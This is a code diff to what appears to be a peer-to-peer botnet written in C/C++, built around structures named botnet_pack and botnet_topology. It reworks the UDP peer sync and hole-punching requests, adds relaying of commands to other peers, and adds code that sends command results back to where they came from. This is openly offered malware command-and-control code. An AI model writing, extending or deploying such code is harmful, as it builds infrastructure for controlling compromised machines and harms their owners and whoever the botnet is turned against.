@@ -67,7 +67,7 @@ void sync_request()
 
 	/* request msg */
 	ZeroMemory(&p, BOTNET_PACK_SIZE);
-	p.type = SYNC_REQUEST;
+	p.type = PACK_TYPE::PEER_REPLY;
 
 	/* send request to all connected networks */
 	for (size_t i = 0; i < adapters_count; i++)
@@ -84,16 +84,16 @@ void sync_request()
 	}
 }
 
-static void sync_reply(struct sockaddr_in client)
+static void sync_reply(struct sockaddr_in& client)
 {
 	/* locals */
-	struct botnet_pack p;
-	
+	struct botnet_pack p;	
+
 	/* reply msg */
 	ZeroMemory(&p, BOTNET_PACK_SIZE);
-	p.type = SYNC_REPLY;
-
-	/* send packet */
+	p.type = PACK_TYPE::PEER_REPLY;
+	p.private_peer.ip = 0xff; // avoid reply
+	/* send the msg */
 	sendto(udp_sock, (char*)&p, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));
 }
 /* end syncs */
@@ -118,7 +118,7 @@ void peer_request()
 	/* destination */
 	server.sin_family = AF_INET;
 	server.sin_port = htons(HOLE_PUNCHING_SERVER_PORT);
-	inet_pton(AF_INET, "192.168.8.2", &server.sin_addr);
+	inet_pton(AF_INET, HOLE_PUNCHING_SERVER_IP, &server.sin_addr);
 
 	/* send request */
 	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
@@ -143,6 +143,9 @@ static void handle_command(u_char* const data, const struct sockaddr_in& src_add
 			if (next_peer.sin_addr.s_addr == command->dst_peer.ip && next_peer.sin_port == command->dst_peer.port)
 				command->dst_peer = { 0, 0 };
 
+			if (next_peer.sin_addr.s_addr == command->private_peer.ip && next_peer.sin_port == command->dst_peer.port)
+				command->private_peer = { 0, 0 };
+
 			sendto(udp_sock, (char*)data, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&next_peer, sizeof(next_peer));
 		}
 	}
@@ -154,13 +157,17 @@ static void handle_command_result(u_char* const data)
 	struct sockaddr_in src_peer;
 	adr addr;
 
-	addr = botnet_topology.retrieveCommand(data);
+	addr = botnet_topology.retrieveCommand((struct botnet_pack*)data);
 	if (addr.ip + addr.port == 0)
 		return;
 
+	/* rebuild the sockaddr_in structure */
 	src_peer.sin_family = AF_INET;
 	src_peer.sin_port = addr.port;
 	src_peer.sin_addr.s_addr = addr.ip;
+
+	/* send back the result */
+	sendto(udp_sock, (char*)data, 1024, 0, (struct sockaddr*)&src_peer, sizeof(src_peer));
 }
 
 static void keep_alive_reply(struct sockaddr_in& client)
@@ -176,20 +183,24 @@ static void keep_alive_reply(struct sockaddr_in& client)
 	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));
 }
 
-static void handle_peer_reply(const u_char* data)
+static void handle_peer_reply(const u_char* data, struct sockaddr_in& client)
 {
 	/* locals */
-	struct botnet_pack pack;
 	struct sockaddr_in peer;
 	BOOL status = 0;
 
 	/* add peer */
-	peer = botnet_topology.addPeer(data, &status);
+	peer = botnet_topology.addPeer((struct botnet_pack*)data, client, &status);
+
+	/* if local peer */
+	if (status == 1)
+		sync_reply(client);
 
 	// open udp session for direct communication
 	if (status)
 	{
 		/* create request */
+		struct botnet_pack pack;
 		ZeroMemory(&pack, BOTNET_PACK_SIZE);
 		pack.type = PACK_TYPE::NETWORK_SYNC_REQUEST;
 
@@ -222,18 +233,13 @@ static int handle_udp_connections()
 	case PACK_TYPE::COMMAND_RESULT:
 		handle_command_result(data);
 		break;
-	case PACK_TYPE::SYNC_REQUEST:
-		sync_reply(client);
-		break;
-	case PACK_TYPE::SYNC_REPLY:
-		break;
 	case PACK_TYPE::PEER_REPLY:
-		handle_peer_reply(data);
+		handle_peer_reply(data, client);
 		break;
 	case PACK_TYPE::NETWORK_SYNC_REQUEST:
 		botnet_topology.sendNetTree(udp_sock, client, hosts ,(char*)data);
 		break;
-	case PACK_TYPE::NETWORK_SYNC:
+	case PACK_TYPE::NETWORK_SYNC_REPLY:
 		botnet_topology.handleSync(data, client);
 		break;
 	case PACK_TYPE::KEEP_ALIVE:
